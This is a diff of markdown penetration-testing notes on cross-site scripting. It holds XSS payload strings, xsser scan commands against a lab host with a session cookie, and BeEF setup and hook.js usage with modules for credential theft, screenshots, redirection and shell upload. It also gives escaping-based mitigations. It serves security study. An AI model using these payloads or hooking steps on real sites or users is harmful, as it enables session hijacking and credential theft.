@@ -11,22 +11,6 @@
     - source: ```?name=alireza => document.url()```
     - sink: ```getElementById()``` & ```document.write()```
 
-## Exploitation
-- Session Hijacking (SEC542-4)
-- Fake Page (SEC542-4)
-- [BeEF](../Tools/beef.md)
-
-## Mitigation
-- Minimize the usage of user input on html
-- Escape any untrusted input before inserting it into the page
-  - ```&``` => ```&amp;```
-  - ```<``` => ```&lt;```
-  - ```>``` => ```&gt;```
-  - ```"``` => ```&quot;```
-  - ```'``` => ```&#x27;```
-  - ```/``` => ```&#x2F;```
-- [XSS-Prevention-CheatSheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) 
-
 ## Payloads
 ```Javascript
 a'"><script>alert(888)</script>
@@ -65,3 +49,41 @@ a';alert(888);'
   - ```xsser --url "http://192.158.102.3/htmli_get.php?firstname=XSS&lastname=hello&form=submit" --cookie="PHPSESSID=j278tohghcg7lbr220uhf4rg22; security_level=0"```
   - ```xsser --url "http://192.158.102.3/htmli_get.php?firstname=XSS&lastname=hello&form=submit" --cookie="PHPSESSID=j278tohghcg7lbr220uhf4rg22; security_level=0" --Fp "<script>alert(1)</script>"```
     - Scan the target using basic XSS payload
+
+## BeEF
+
+- Initialize
+  - Install
+    - ```apt update```
+    - ```apt install beef-xss```
+  - Change username/password
+    -```nano /etc/beef-xss/config.yaml```
+
+- Run
+  - ```beef-xss```  
+  - Browser => 127.0.0.1:3000/ui/panel
+
+- Usage
+  - 127.0.0.1:3000/hook.js
+  - 192.168.8.106:3000/demos/basic.html
+
+- Useful commands
+  - Steal Credentials
+    - Social Engineering -> Pretty Theft
+  - Screenshot
+    - Browser -> Spyder Eye     
+  - Redirect 
+    - Browser -> Hooked Domain -> Redirect Browser  
+  - Shell Upload with update
+    - Social Engineering -> Fake Notification Bar(Firefox)
+
+## Mitigation
+- Minimize the usage of user input on html
+- Escape any untrusted input before inserting it into the page
+  - ```&``` => ```&amp;```
+  - ```<``` => ```&lt;```
+  - ```>``` => ```&gt;```
+  - ```"``` => ```&quot;```
+  - ```'``` => ```&#x27;```
+  - ```/``` => ```&#x2F;```
+- [XSS-Prevention-CheatSheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) 
